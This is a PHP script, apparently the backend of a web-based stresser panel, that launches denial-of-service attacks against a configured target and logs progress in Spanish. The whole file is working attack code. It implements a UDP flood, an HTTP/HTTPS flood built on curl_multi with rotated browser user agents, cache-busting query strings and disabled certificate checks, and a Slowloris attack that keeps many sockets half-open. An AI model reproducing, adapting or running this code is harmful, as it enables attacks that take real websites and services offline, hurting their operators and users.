<?php
set_time_limit(0);
ignore_user_abort(true);
ini_set('memory_limit','1024M');

$dir=__DIR__.'/runtime';
$logFile="$dir/attack.log";
$cfgFile="$dir/attack.cfg";
$pidFile="$dir/attack.pid";

function L($m){
    global $logFile;
    file_put_contents($logFile,'['.date('H:i:s').'] '.$m."\n",FILE_APPEND);
}

if(!file_exists($cfgFile)){L('no config');exit;}
$c=json_decode(file_get_contents($cfgFile),true);
extract($c);

L("Objetivo   : $target");
L("Tipo       : ".strtoupper($type));
L("Intensidad : $intensity");
L("Duración   : {$seconds}s");
L("Threads    : $threads | Sockets: $sockets | Size: $size");
L(str_repeat('─',46));

$end=time()+$seconds;
$start=time();

// force kill self when time is up (safety)
pcntl_async_signals(true);
if(function_exists('pcntl_signal')){
    pcntl_signal(SIGALRM,function(){global $pidFile;L('TIMER FORCE KILL');@unlink($pidFile);exit(0);});
    pcntl_alarm($seconds+3);
}

function parse_t($t){
    $t=preg_replace('#^https?://#','',$t);
    $p=explode(':',$t);
    return [$p[0],isset($p[1])?(int)$p[1]:null];
}

/* ===================== UDP ===================== */
if($type==='udp'){
    [$host,$port]=parse_t($target);
    $port=$port?:80;
    L("UDP FLOOD → $host:$port");
    $payload=random_bytes(min($size,65507));
    $sent=0;$ok=0;$fail=0;$last=0;$tick=time();

    while(time()<$end){
        for($i=0;$i<$threads;$i++){
            $s=@socket_create(AF_INET,SOCK_DGRAM,SOL_UDP);
            if($s){
                $r=@socket_sendto($s,$payload,strlen($payload),0,$host,$port);
                @socket_close($s);
                $sent++;
                if($r!==false)$ok++;else$fail++;
            }else $fail++;
        }
        if(time()-$tick>=1){
            $rate=(int)(($sent-$last)/max(1,time()-$tick));
            L("CONN  ok=$ok  fail=$fail  total=$sent  rate~{$rate}/s");
            $last=$sent;$ok=0;$fail=0;$tick=time();
        }
        usleep(50);
    }
    L("UDP DONE · total=$sent");
}

/* ===================== HTTP / HTTPS (curl_multi) ===================== */
elseif($type==='http'||$type==='https'){
    $url=$target;
    if(!preg_match('#^https?://#',$url))
        $url=($type==='https'?'https://':'http://').$url;
    L(strtoupper($type)." FLOOD → $url  (curl_multi parallel)");

    $agents=[
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
        'Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) Mobile/15E148',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101',
        'Mozilla/5.0 (Linux; Android 14) Chrome/120.0.6099.144',
    ];

    // how many concurrent handles per batch
    $batch=min($threads,800); // curl_multi practical limit
    $sent=0;$ok=0;$fail=0;$last=0;$tick=time();

    while(time()<$end){
        $mh=curl_multi_init();
        $handles=[];
        for($i=0;$i<$batch;$i++){
            $ch=curl_init();
            $full=$url.(strpos($url,'?')===false?'?':'&').'_='.mt_rand();
            curl_setopt_array($ch,[
                CURLOPT_URL=>$full,
                CURLOPT_RETURNTRANSFER=>true,
                CURLOPT_TIMEOUT_MS=>1200,
                CURLOPT_CONNECTTIMEOUT_MS=>800,
                CURLOPT_FOLLOWLOCATION=>false,
                CURLOPT_SSL_VERIFYPEER=>false,
                CURLOPT_SSL_VERIFYHOST=>0,
                CURLOPT_USERAGENT=>$agents[array_rand($agents)],
                CURLOPT_HTTPHEADER=>['Accept: */*','Connection: close'],
                CURLOPT_NOSIGNAL=>1,
            ]);
            curl_multi_add_handle($mh,$ch);
            $handles[]=$ch;
        }

        $running=null;
        do{
            curl_multi_exec($mh,$running);
            curl_multi_select($mh,0.05);
        }while($running>0 && time()<$end);

        foreach($handles as $ch){
            $info=curl_getinfo($ch);
            $err=curl_errno($ch);
            $sent++;
            if($err===0 && $info['http_code']>0)$ok++;else$fail++;
            curl_multi_remove_handle($mh,$ch);
            curl_close($ch);
        }
        curl_multi_close($mh);

        if(time()-$tick>=1){
            $rate=(int)(($sent-$last)/max(1,time()-$tick));
            L("CONN  ok=$ok  fail=$fail  total=$sent  rate~{$rate} req/s  concurrent=$batch");
            $last=$sent;$ok=0;$fail=0;$tick=time();
        }
    }
    L(strtoupper($type)." DONE · total=$sent");
}

/* ===================== SLOWLORIS ===================== */
elseif($type==='slow'){
    [$host,$port]=parse_t($target);
    $port=$port?:80;
    L("SLOWLORIS → $host:$port · target $sockets sockets");

    $list=[];$opened=0;
    for($i=0;$i<$sockets;$i++){
        $s=@fsockopen($host,$port,$errno,$errstr,1.2);
        if($s){
            stream_set_blocking($s,false);
            @fwrite($s,"GET /?".mt_rand()." HTTP/1.1\r\n");
            @fwrite($s,"Host: $host\r\n");
            @fwrite($s,"User-Agent: Mozilla/5.0\r\n");
            @fwrite($s,"Accept-Language: en-US,en;q=0.5\r\n");
            $list[]=$s;$opened++;
        }
    }
    L("OPENED  $opened / $sockets sockets");

    $tick=time();
    while(time()<$end){
        $alive=0;$reopen=0;
        foreach($list as $k=>$s){
            if(!is_resource($s)||@feof($s)){
                unset($list[$k]);
                $news=@fsockopen($host,$port,$errno,$errstr,0.8);
                if($news){
                    stream_set_blocking($news,false);
                    @fwrite($news,"GET /?".mt_rand()." HTTP/1.1\r\nHost: $host\r\n");
                    $list[]=$news;$reopen++;
                }
                continue;
            }
            @fwrite($s,"X-a: ".mt_rand(1,99999)."\r\n");
            $alive++;
        }
        if(time()-$tick>=1){
            L("CONN  alive=$alive  reopened=+$reopen  pool=".count($list));
            $tick=time();
        }
        usleep(200000);
    }
    foreach($list as $s)@fclose($s);
    L("SLOWLORIS DONE");
}

L(str_repeat('─',46));
L("Tiempo real: ".(time()-$start)."s");
L("FIN — ataque terminado por tiempo");
@unlink($pidFile);
